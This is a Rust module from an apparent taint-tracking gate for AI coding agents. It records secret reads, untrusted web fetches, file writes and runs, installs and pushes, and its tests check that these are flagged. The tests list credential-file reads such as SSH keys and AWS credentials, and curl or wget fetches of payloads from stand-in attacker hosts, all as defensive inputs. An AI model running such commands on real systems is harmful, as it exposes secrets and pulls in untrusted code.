//! What one call does, as taint needs it: whether it brings untrusted
//! content or a secret into the chat, which files it writes and runs, which
//! hosts it reaches, whether it installs or pushes.

use std::path::Path;

use derm_core::policy::{decode_escapes, fold_text};
use derm_tap::results::{hosts, kinds};
use serde_json::Value;

use super::{paths, shell};

/// What made the chat tainted: the record's `reason` and the kind.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Source {
    pub reason: &'static str,
    pub kind: &'static str,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Facts {
    pub source: Option<Source>,
    /// Keys of files the call writes.
    pub writes: Vec<String>,
    /// Files the call runs: as named, and their key.
    pub runs: Vec<(String, String)>,
    /// Hosts the call reaches, canonical.
    pub hosts: Vec<String>,
    pub install: bool,
    pub push: bool,
}

impl Facts {
    /// Nothing taint reads or keeps.
    pub fn is_empty(&self) -> bool {
        self.source.is_none()
            && self.writes.is_empty()
            && self.runs.is_empty()
            && self.hosts.is_empty()
            && !self.install
            && !self.push
    }
}

/// Tools that write files, by the gate's normalized name: the gate core's
/// `WRITE_TOOLS` and the other agents' file writers (Gemini CLI 0.68.0's
/// `write_file` and `replace`, Copilot's `create`, Antigravity's
/// `write_to_file` and `replace_file_content`).
const WRITERS: &[&str] = &[
    "write",
    "edit",
    "multiedit",
    "notebookedit",
    "apply_patch",
    "patch",
    "write_file",
    "replace",
    "create",
    "edit_file",
    "write_to_file",
    "replace_file_content",
    "str_replace_editor",
];

fn strings<'v>(v: &'v Value, out: &mut Vec<(&'v str, &'v str)>, key: &'v str, depth: usize) {
    if depth > 64 {
        return;
    }
    match v {
        Value::String(s) => out.push((key, s)),
        Value::Array(a) => a.iter().for_each(|x| strings(x, out, key, depth + 1)),
        Value::Object(o) => o
            .iter()
            .for_each(|(k, x)| strings(x, out, k.as_str(), depth + 1)),
        _ => {}
    }
}

fn path_field(k: &str) -> bool {
    let k = k.to_ascii_lowercase();
    k.contains("path") || k.contains("file") || k == "target" || k == "dest"
}

/// The files a patch names (`*** Add File: p`, Codex's form; `+++ b/p`,
/// a unified diff's).
fn patch_files(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for line in text.lines() {
        let l = line.trim();
        for p in [
            "*** Add File:",
            "*** Update File:",
            "*** Move to:",
            "*** Delete File:",
        ] {
            if let Some(f) = l.strip_prefix(p) {
                out.push(f.trim().to_string());
            }
        }
        if let Some(f) = l.strip_prefix("+++ ") {
            let f = f.trim();
            let f = f.strip_prefix("b/").unwrap_or(f);
            if f != "/dev/null" {
                out.push(f.to_string());
            }
        }
    }
    out
}

/// A word that names a path, for the secret check: a word with a `/` or a
/// `\` (a native Windows path, `C:\Users\u\.ssh\id_rsa`: Windows test w6,
/// WW6-2; `paths::key` already reads `\` as `/`), or starting with `.`, `~`
/// or `$`. Only ever finds more reads, so taint only raises.
fn path_like(w: &str) -> bool {
    w.contains('/')
        || w.contains('\\')
        || w.starts_with('.')
        || w.starts_with('~')
        || w.starts_with('$')
}

/// The facts of a call to the tool the gate normalized as `normalized`,
/// read from `cwd` with `home` for `~`.
pub fn of(normalized: &str, input: &Value, cwd: &Path, home: Option<&Path>) -> Facts {
    let mut f = Facts::default();
    let key = |raw: &str| paths::key(raw, cwd, home);
    let mut all = Vec::new();
    strings(input, &mut all, "", 0);
    if let Some(kind) = kinds::untrusted(normalized) {
        f.source = Some(Source {
            reason: "untrusted-content",
            kind,
        });
    }
    let mut secret = false;
    if super::super::core::is_shell_tool(normalized) {
        let text = super::super::core::input_text_for(normalized, input).unwrap_or_default();
        let folded = fold_text(&decode_escapes(&text));
        let s = shell::read(&folded);
        f.writes = s.writes.iter().map(|w| key(w)).collect();
        f.runs = s.runs.iter().map(|r| (r.clone(), key(r))).collect();
        f.hosts = s.hosts;
        f.push = s.push;
        f.install = !derm_core::installs::parse::parse_installs(&folded).is_empty();
        // BW6-6: a fetching program's page is untrusted content, as a fetch
        // tool's is (`kinds::untrusted`).
        if f.source.is_none() && !s.fetched.is_empty() {
            f.source = Some(Source {
                reason: "untrusted-content",
                kind: "web",
            });
        }
        secret = s
            .words
            .iter()
            .filter(|w| path_like(w))
            .any(|w| paths::secret(&key(w)));
    } else {
        let writer = WRITERS.contains(&normalized);
        for (k, v) in &all {
            if writer && path_field(k) {
                f.writes.push(key(v));
            }
            if writer && (normalized == "apply_patch" || normalized == "patch") {
                f.writes.extend(patch_files(v).iter().map(|p| key(p)));
            }
            if !writer && path_like(v) && v.len() < 4096 && paths::secret(&key(v)) {
                secret = true;
            }
        }
        if let Value::String(s) = input {
            if normalized == "apply_patch" || normalized == "patch" {
                f.writes.extend(patch_files(s).iter().map(|p| key(p)));
            }
        }
    }
    for (_, v) in &all {
        for h in hosts::url_hosts(v) {
            if !f.hosts.contains(&h) {
                f.hosts.push(h);
            }
        }
    }
    if secret && f.source.is_none() {
        f.source = Some(Source {
            reason: "secret-read",
            kind: "secret",
        });
    }
    f.writes.sort();
    f.writes.dedup();
    f
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn facts(tool: &str, input: Value) -> Facts {
        of(tool, &input, Path::new("/w"), Some(Path::new("/home/u")))
    }

    #[test]
    fn a_fetch_an_mcp_page_and_an_unknown_tool_taint() {
        let f = facts(
            "webfetch",
            json!({"url": "https://docs.example.test/x", "prompt": "p"}),
        );
        assert_eq!(f.source.unwrap().kind, "web");
        assert_eq!(f.hosts, vec!["docs.example.test"]);
        let f = facts(
            "playwright/browser_navigate",
            json!({"url": "https://notes.example.net/setup"}),
        );
        assert_eq!(f.source.unwrap().kind, "mcp");
        assert!(facts("brand_new_tool", json!({})).source.is_some());
        assert!(facts("read", json!({"file_path": "/w/readme.md"})).is_empty());
    }

    #[test]
    fn a_secret_read_taints_by_file_tool_and_by_shell() {
        let f = facts("read", json!({"file_path": "/home/u/.aws/credentials"}));
        assert_eq!(f.source.unwrap().reason, "secret-read");
        let f = facts("bash", json!({"command": "cat ~/.ssh/id_rsa | head"}));
        assert_eq!(f.source.unwrap().reason, "secret-read");
        assert!(facts("bash", json!({"command": "echo credentials"}))
            .source
            .is_none());
        // A write of a secret file is a write, not a read.
        let f = facts("write", json!({"file_path": "/w/.env", "content": "A=1"}));
        assert!(f.source.is_none());
        assert_eq!(f.writes, vec!["/w/.env"]);
    }

    /// Box test w6, BW6-6: a shell fetch brings a page into the chat as a
    /// web fetch tool does, and marked nothing (`marks: []` after `curl
    /// https://example.org/`). OpenMoat 0.19.0 decides a `curl` or `wget`
    /// that sends nothing but the request as a fetch, whose result taints
    /// (`shell/commands/fetch.rs:1-25`, `shell/commands.rs:497-552`,
    /// `engine/taint.rs:70-77`). derm marks any call of a fetching program
    /// that names a URL off this machine: taint only raises.
    #[test]
    fn bw6_6_a_shell_fetch_taints_like_a_fetch_tool() {
        for cmd in [
            "curl -s -o /dev/null -w %{http_code} https://example.org/",
            "wget -qO- https://e.test/a.sh",
            "curl -X POST https://api.e.test/v1 -d @x.json",
            "xh https://e.test/x",
            "cd /tmp && curl -fsSL https://e.test/i",
        ] {
            let f = facts("bash", json!({ "command": cmd }));
            assert_eq!(
                f.source.map(|s| (s.reason, s.kind)),
                Some(("untrusted-content", "web")),
                "{cmd}"
            );
        }
        for cmd in [
            "curl -s http://127.0.0.1:3000/health",
            "curl http://localhost:8080/",
            "echo https://example.org/",
            "git log --oneline",
        ] {
            assert!(
                facts("bash", json!({ "command": cmd })).source.is_none(),
                "{cmd}"
            );
        }
    }

    /// Review FP1-R2 and FP1-R3: curl and wget take a URL with no scheme
    /// as `http://` (curl 8.5.0, run: `curl -w '%{url_effective}'
    /// example.invalid/x` prints `http://example.invalid/x`), and a name that
    /// only begins `127.` is no loopback address.
    #[test]
    fn fp1_r2_r3_a_fetch_with_no_scheme_or_a_127_name_taints() {
        for cmd in [
            "curl -s evil.example/payload.txt",
            "wget -qO- evil.example/x",
            "curl https://127.attacker.example/x",
            "curl 127.attacker.example/x",
            // Re-review FP1-RR1.
            "curl -e http://localhost/ evil.example/payload",
            "curl http://localhost:1/ evil.example/x",
            "curl -Kcfg",
            "curl -sK -",
            "curl --config=c.txt",
            "wget -i -",
            "wget --input-file=list",
        ] {
            let f = facts("bash", json!({ "command": cmd }));
            assert_eq!(
                f.source.map(|s| (s.reason, s.kind)),
                Some(("untrusted-content", "web")),
                "{cmd}"
            );
        }
        for cmd in [
            "curl localhost:8080/x",
            "curl 127.0.0.1:3000/health",
            "curl -s [::1]:9/x",
            "curl -o out.txt http://localhost:8080/x",
            // Re-review FP1-RR2: option values are no hosts.
            "curl -s -X POST -H 'content-type: application/json' localhost:3000/api",
            "curl -o out.json localhost:3000/x",
            "curl -i http://localhost:3000/",
            "curl -k https://localhost:8443/",
            "curl -sk localhost:8443/health",
        ] {
            assert!(
                facts("bash", json!({ "command": cmd })).source.is_none(),
                "{cmd}"
            );
        }
    }

    /// Windows test w6, WW6-2: a file tool on Windows names a secret by its
    /// native path (`tool_input.file_path` with `\`, the shape the Windows
    /// test drove the hook with by hand; not recorded from Claude Code on
    /// Windows, which the box has not had). It marks the chat as the same
    /// read spelled with `/` does.
    #[test]
    fn ww6_2_a_secret_read_by_a_native_windows_path_taints() {
        for p in [
            "C:\\Users\\usern\\.ssh\\id_test",
            "C:\\Users\\usern\\.aws\\credentials",
            "\\\\server\\share\\.ssh\\id_rsa",
            ".ssh\\id_test",
        ] {
            let f = facts("read", json!({ "file_path": p }));
            assert_eq!(f.source.map(|s| s.reason), Some("secret-read"), "{p}");
        }
        // A plain native path still marks nothing.
        assert!(facts(
            "read",
            json!({"file_path": "C:\\Users\\usern\\proj\\README.md"})
        )
        .is_empty());
    }

    #[test]
    fn writes_and_runs_get_keys() {
        let f = facts("write", json!({"file_path": "/w/diag.py", "content": "x"}));
        assert_eq!(f.writes, vec!["/w/diag.py"]);
        let f = facts("bash", json!({"command": "echo 'echo checking' > run.sh"}));
        assert_eq!(f.writes, vec!["/w/run.sh"]);
        let f = facts("bash", json!({"command": "bash run.sh"}));
        assert_eq!(
            f.runs,
            vec![("run.sh".to_string(), "/w/run.sh".to_string())]
        );
        let f = facts(
            "apply_patch",
            json!({"input": "*** Begin Patch\n*** Add File: tools/x.sh\n+echo\n*** End Patch"}),
        );
        assert_eq!(f.writes, vec!["/w/tools/x.sh"]);
    }

    #[test]
    fn installs_and_pushes_are_seen() {
        assert!(facts("bash", json!({"command": "npm install left-pad"})).install);
        assert!(facts("bash", json!({"command": "git push origin main"})).push);
        assert!(!facts("bash", json!({"command": "git status"})).push);
    }
}
